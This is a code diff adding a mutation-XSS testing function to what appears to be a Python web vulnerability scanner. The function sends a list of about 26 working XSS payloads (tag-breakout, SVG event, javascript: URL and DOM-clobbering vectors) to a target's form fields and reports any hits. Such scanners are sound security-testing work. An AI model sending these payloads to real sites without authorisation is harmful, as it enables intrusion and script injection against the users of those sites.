@@ -1988,7 +1988,108 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
     console.print(f"[bold green]Test results saved to 'all_forms_test_results.json'[/bold green]")
     
     return results
-
+async def test_mutation_xss(url, input_fields, cookies, user_agents, method="POST", proxies=None, 
+                           ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, 
+                           verbose_all=False, secs=0, payload_filters=None):
+    """
+    Test Mutation XSS vulnerabilities
+    """
+    console.print("[bold blue]🧬 Testing Mutation XSS vulnerabilities...[/bold blue]")
+    
+    # Mutation XSS specific payloads
+    mutation_xss_payloads = [
+        # Classic mutation vectors
+        {"inputField": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "category": "mXSS"},
+        {"inputField": "<textarea><script>alert(1)</script></textarea>", "category": "mXSS"},
+        {"inputField": "<select><style></select><img src=x onerror=alert(1)>", "category": "mXSS"},
+        {"inputField": "<svg><style></svg><img src=x onerror=alert(1)>", "category": "mXSS"},
+        
+        # HTML5 mutation vectors
+        {"inputField": "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>", "category": "mXSS"},
+        {"inputField": "<table><td><script>alert(1)</script></td></table>", "category": "mXSS"},
+        {"inputField": "<div><style></div><img src=x onerror=alert(1)>", "category": "mXSS"},
+        
+        # Template injection mutations
+        {"inputField": "<template><script>alert(1)</script></template>", "category": "mXSS"},
+        {"inputField": "<div><template><img src=x onerror=alert(1)></template></div>", "category": "mXSS"},
+        
+        # Shadow DOM related
+        {"inputField": "<div><shadow></shadow><script>alert(1)</script></div>", "category": "mXSS"},
+        
+        # Comment mutation vectors
+        {"inputField": "<!--<script>-->alert(1)<!--</script>-->", "category": "mXSS"},
+        {"inputField": "<div><!--</div><img src=x onerror=alert(1)>-->", "category": "mXSS"},
+        
+        # CDATA mutation vectors
+        {"inputField": "<![CDATA[<script>alert(1)</script>]]>", "category": "mXSS"},
+        {"inputField": "<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]>", "category": "mXSS"},
+        
+        # Entity encoding mutations
+        {"inputField": "&lt;script&gt;alert(1)&lt;/script&gt;", "category": "mXSS"},
+        {"inputField": "&#60;script&#62;alert(1)&#60;/script&#62;", "category": "mXSS"},
+        
+        # Mixed context mutations
+        {"inputField": "<div style=\"background:url('javascript:alert(1)')\">test</div>", "category": "mXSS"},
+        {"inputField": "<a href=\"javascript:alert(1)\">click</a>", "category": "mXSS"},
+        
+        # DOM clobbering mutations
+        {"inputField": "<form name=\"alert\"><input name=\"1\"></form>", "category": "mXSS"},
+        {"inputField": "<img name=\"outerHTML\"><div>test</div>", "category": "mXSS"},
+        
+        # Mutation-specific payloads
+        {"inputField": "<xss id=\"</xss><img src=x onerror=alert(1)>\">", "category": "mXSS"},
+        {"inputField": "<div data-xss=\"</div><script>alert(1)</script>\">content</div>", "category": "mXSS"},
+        
+        # SVG mutations
+        {"inputField": "<svg><animate onbegin=\"alert(1)\" attributeName=\"x\" dur=\"1s\"></svg>", "category": "mXSS"},
+        {"inputField": "<svg><set onbegin=\"alert(1)\" attributeName=\"x\" to=\"1\"></svg>", "category": "mXSS"},
+        
+        # MathML mutations
+        {"inputField": "<math><mi xlink:href=\"javascript:alert(1)\">test</mi></math>", "category": "mXSS"},
+        
+        # Namespace mutations
+        {"inputField": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></div>", "category": "mXSS"}
+    ]
+    
+    if payload_filters:
+        filter_patterns = [pattern.strip() for pattern in payload_filters.split(",")]
+        mutation_xss_payloads = filter_payloads(mutation_xss_payloads, filter_patterns)
+        console.print(f"[yellow]Filtered mXSS payloads: {len(mutation_xss_payloads)}[/yellow]")
+    
+    results = []
+    
+    for field in input_fields:
+        console.print(f"[cyan]Testing field: {field.get('name', 'unnamed')}[/cyan]")
+        
+        field_results = await test_input_field(
+            url, mutation_xss_payloads, "mXSS", cookies, user_agents, field,
+            method, proxies, ssl_cert, ssl_key, ssl_verify,
+            verbose, verbose_all, payload_filters, secs,
+            brute_mode=False  # brute
+        )
+        
+        if field_results:  # Check if results is not None
+            results.extend(field_results)
+        else:
+            console.print(f"[yellow]No results returned for field: {field.get('name', 'unnamed')}[/yellow]")
+    
+    # Analyze mutation-specific patterns
+    mutation_results = []
+    for result in results:
+        if "mXSS" in str(result.get('vulnerabilities', [])):
+            mutation_results.append(result)
+    
+    if mutation_results:
+        console.print("[bold red]🚨 MUTATION XSS VULNERABILITIES DETECTED![/bold red]")
+        for result in mutation_results:
+            console.print(f"[red]Field: {result.get('field', 'unknown')}[/red]")
+            console.print(f"[red]Payload: {result.get('payload', 'unknown')}[/red]")
+            console.print(f"[red]Vulnerabilities: {result.get('vulnerabilities', [])}[/red]")
+            console.print("[red]" + "="*50 + "[/red]")
+    else:
+        console.print("[green]✅ No mutation XSS vulnerabilities detected[/green]")
+    
+    return results
 def analyze_mutation_xss_response(content, payload):
     vulnerabilities = []
     
